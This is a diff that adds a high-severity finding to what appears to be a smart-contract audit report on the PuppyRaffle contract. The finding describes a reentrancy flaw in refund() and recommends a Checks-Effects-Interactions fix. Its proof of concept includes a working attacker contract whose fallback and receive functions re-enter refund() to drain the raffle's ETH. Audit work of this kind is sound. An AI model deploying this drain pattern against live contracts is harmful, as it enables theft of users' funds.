@@ -89,3 +89,141 @@ function test_denialOfServices() public {
         emit RaffleEnter(newPlayers); 
     }
 ```
+
+### [H-1] Reentrancy Attack found in `PuppleRaffle::refund`, allowing attacker to steal the contract balance
+
+**Description :** The `PuppleRaffle::refund` function is vulnerable to reentrancy due to its current design, potentially allowing an attacker to exploit the contract's state before executing the necessary state changes.
+
+in the `PuppleRaffle::refund` function, we know that the function doing external call and then change the statement of contract.
+
+```javascript
+function refund(uint256 playerIndex) public {
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+@>  payable(msg.sender).sendValue(entranceFee);
+
+@>  players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+}
+```
+
+A player who has entered the raffle could have fallback/receive function to exploit the contract after player doing. Fallback/receive will execute recursively before state of the contract change and automatically steal all of ether.
+
+**Impact :** In the worst-case scenario, an attacker could drain the entire ETH balance of the contract if successful, leading to a loss of all funds held by the `PuppleRaffle` contract.
+
+**Vulnerability Explanation :**
+The refund function allows a player to withdraw their entrance fee (`entranceFee`) by sending ETH back to `msg.sender`. However, this function does not follow the Checks-Effects-Interactions (CEI) pattern, which is crucial in preventing reentrancy attacks. After sending ETH (`sendValue`), the function changes the contract state (`players[playerIndex] = address(0);`). This sequence of operations allows an attacker to recursively call back into the contract before the state is updated, potentially stealing more ETH than they are entitled to.
+
+**Proof of Concepts :** 
+<details>
+
+<summary> Code </summary>
+
+```javascript
+
+Contract PuppyRaffleTest is Test {
+    ...
+    modifier playersEntered() {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        _;
+    }
+
+    function test_reentrancyRefund() public playersEntered {
+        AttackerReentrancy attackerContract = new AttackerReentrancy(puppyRaffle);
+        
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        console.log("starting attack contract balance : ", startingAttackContractBalance);
+        console.log("starting puppy raffle balance : ", startingPuppyRaffleBalance);
+
+        attackerContract.attack{value: entranceFee}();
+        
+        uint256 endingAttackContractBalance = address(attackerContract).balance;
+        uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        console.log("ending attack contract balance : ", endingAttackContractBalance);
+        console.log("ending puppy raffle balance : ", endingPuppyRaffleBalance);
+    }
+
+}
+
+contract AttackerReentrancy {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee ;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle puppyRuffle_){
+        puppyRaffle = puppyRuffle_;
+        entranceFee = puppyRaffle.entranceFee();
+    } 
+
+    function attack() external payable {
+        address[] memory addressContract = new address[](1);
+        addressContract[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(addressContract);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if(address(puppyRaffle).balance > 0){
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable{
+        _stealMoney();
+    }
+
+    receive() external payable{
+        _stealMoney();
+    }
+}
+
+```
+
+The scenario is ...
+
+</details>
+**Recommended mitigation :** To avoid this problem, there are many ways such as using CEI pattern, using openzeppelin contract `ReentrancyGuard` as well, but i just show you how to implement CEI pattern for function `PuppleRaffle::refund`.
+
+Before : 
+
+```javascript
+function refund(uint256 playerIndex) public {
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+    payable(msg.sender).sendValue(entranceFee);
+    
+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+}
+```
+
+After : 
+
+```javascript
+function refund(uint256 playerIndex) public {
+    // Check
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+    // Effect
+    players[playerIndex] = address(0);
+
+    // Interact
+    payable(msg.sender).sendValue(entranceFee);    
+    emit RaffleRefunded(playerAddress);
+}
+```
